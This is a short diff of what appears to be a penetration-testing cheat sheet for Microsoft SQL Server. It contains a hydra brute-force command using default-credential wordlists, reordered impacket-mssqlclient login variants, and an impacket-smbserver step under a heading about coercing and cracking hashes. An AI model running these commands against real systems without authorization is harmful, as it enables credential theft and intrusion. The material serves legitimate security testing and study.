@@ -864,9 +864,9 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
 [###] Login
-impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
-impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
-impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
+impacket-mssqlclient '$USERNAME:$PASSWORD'@'$TARGET' -windows-auth
+impacket-mssqlclient '$DOM/$USERNAME:$PASSWORD'@'$TARGET'
+impacket-mssqlclient -dc-ip $TARGET -target-ip $TARGET -k -no-pass $DC
 
 [###] Coerce Hash + Crack
 impacket-smbserver -smb2support $ /Upload/windows
